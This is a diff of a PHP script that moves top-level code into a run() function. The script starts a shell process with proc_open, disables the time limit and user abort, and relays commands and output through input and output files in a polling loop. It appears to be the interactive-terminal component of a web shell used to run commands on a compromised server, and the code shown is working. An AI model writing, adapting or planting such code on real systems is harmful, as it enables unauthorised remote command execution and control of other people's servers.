@@ -2,7 +2,7 @@
 //global: $pwd, $outfile, $infile, $shell
 ignore_user_abort(true);
 set_time_limit(0);
-chdir($pwd);
+
 function iswin(){
     return strpos(strtoupper(PHP_OS), "WIN")===0;
 }
@@ -21,66 +21,71 @@ function is_run($proc){
     if($staus === false || !$staus['running']) return false;
     return true;
 }
-if(function_exists('proc_open')){
-    $descriptorspec = array(
-        0 => array("pipe", "r"),
-        1 => array("pipe", "w"),
-        2 => array("pipe", "w")
-     );
-    if(iswin()){
+function run($vars){
+    extract($vars);
+    chdir($pwd);
+    
+    if(function_exists('proc_open')){
         $descriptorspec = array(
             0 => array("pipe", "r"),
-            1 => array("file", $outfile, "w"),
+            1 => array("pipe", "w"),
             2 => array("pipe", "w")
          );
-    }
-    $process = proc_open($shell, $descriptorspec, $pipes);
-    if (is_resource($process)) {
-        fclose(fopen($outfile, "wb"));
-        fclose(fopen($infile, "wb"));
-        sleep(1);
-        if(!iswin())
-            stream_set_blocking($pipes[1], false);
-        while(is_run($process) && file_exists($infile) && file_exists($outfile)){
-            if(!iswin()){
-                $msg = readall($pipes[1]);
-                //trigger_error($msg." Read by pipe! ", E_USER_ERROR);
-                if($msg != ''){
-                    //trigger_error($msg." Read by pipe! ", E_USER_ERROR);
-                    $out = fopen($outfile, "ab");
-                    flock($out, LOCK_EX);
-                    fwrite($out, $msg);
-                    flock($out, LOCK_UN);
-                    fclose($out);
-                }
-            }
-
-            $in = fopen($infile, "rb+");
-            flock($in, LOCK_EX);
-            $msg = readall($in);
-            ftruncate($in, 0);
-            rewind($in);
-            fflush($in);
-            flock($in, LOCK_UN);
-            fclose($in);
-            if($msg != ''){
-                fwrite($pipes[0], $msg);
-            }
-            //sleep(1);
-            usleep(200000);
+        if(iswin()){
+            $descriptorspec = array(
+                0 => array("pipe", "r"),
+                1 => array("file", $outfile, "w"),
+                2 => array("pipe", "w")
+             );
         }
-        fclose($pipes[0]);
-        fclose($pipes[1]);
-        fclose($pipes[2]);
-        proc_close($process);
-        if(file_exists($infile))
-            unlink($infile);
-        if(file_exists($outfile))
-            unlink($outfile);
+        $process = proc_open($shell, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            fclose(fopen($outfile, "wb"));
+            fclose(fopen($infile, "wb"));
+            sleep(1);
+            if(!iswin())
+                stream_set_blocking($pipes[1], false);
+            while(is_run($process) && file_exists($infile) && file_exists($outfile)){
+                if(!iswin()){
+                    $msg = readall($pipes[1]);
+                    //trigger_error($msg." Read by pipe! ", E_USER_ERROR);
+                    if($msg != ''){
+                        //trigger_error($msg." Read by pipe! ", E_USER_ERROR);
+                        $out = fopen($outfile, "ab");
+                        flock($out, LOCK_EX);
+                        fwrite($out, $msg);
+                        flock($out, LOCK_UN);
+                        fclose($out);
+                    }
+                }
+    
+                $in = fopen($infile, "rb+");
+                flock($in, LOCK_EX);
+                $msg = readall($in);
+                ftruncate($in, 0);
+                rewind($in);
+                fflush($in);
+                flock($in, LOCK_UN);
+                fclose($in);
+                if($msg != ''){
+                    fwrite($pipes[0], $msg);
+                }
+                //sleep(1);
+                usleep(200000);
+            }
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            if(file_exists($infile))
+                unlink($infile);
+            if(file_exists($outfile))
+                unlink($outfile);
+        }else{
+            return "-2";
+        }
     }else{
-        die("-2");
+        return "-1";
     }
-}else{
-    die("-1");
+    echo "1";
 }
-echo "1";
